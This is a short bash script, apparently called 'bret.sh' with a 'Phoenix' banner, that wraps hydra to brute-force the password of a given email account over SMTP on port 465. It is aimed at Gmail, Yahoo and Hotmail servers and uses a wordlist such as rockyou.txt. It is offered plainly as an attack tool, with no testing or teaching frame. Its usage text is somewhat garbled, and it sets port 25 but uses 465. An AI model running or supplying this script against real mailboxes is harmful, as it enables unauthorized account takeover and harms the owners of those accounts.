#!/bin/bash
red=`tput setaf 1`
white=`tput setaf 7`
green=`tput setaf 2`
blue=`tput setaf 4`

email=$1
wordlist=$2
service=$3
port=25

clear 


services() {
    gmail="smtp.gmail.com"
    yahoo="smtp.mail.yahoo.com"
    hotmail="smtp.live.com"
    echo "___________supported services_________"
    echo $gmail
    echo $yahoo
    echo $hotmail
}

banner() {
    printf "$white\n ______ __                       __     "   
    printf "$white\n|   __ \  |--.-----.-----.-----.|__|.--.--."
    printf "$white\n|    __/     |  _  |  -__|     ||  ||_   _|"
    printf "$white\n|___|  |__|__|_____|_____|__|__||__||__.__|\n"
    printf "$blue──────────────────────────────────────────\n"
}


if [ $# -eq 0 ]
then
   banner
   echo "$red[!] Try ./bret.sh      example300@gmail.com rockyou.txt smtp.gmail.com"
   echo "$red[!]      |__Filename   |__Email   |__mail   |__wordlist  |__service   "
   services
   exit 0
fi

if [ `whoami` != "root" ]
then
   echo "$red[!] This Script Needs To Be Run As Root User"
   exit 0
fi

main() {
    clear
    banner
    echo "$blue[+] Starting Brute Force....."
    echo "$blue[+] Attacking service -> $white$service$blue on $white$port"
    echo "$blue[+] Using URL         -> $white$service"
    hydra -S -l $email -P $wordlist -e ns -V -s 465 $service smtp

}

main
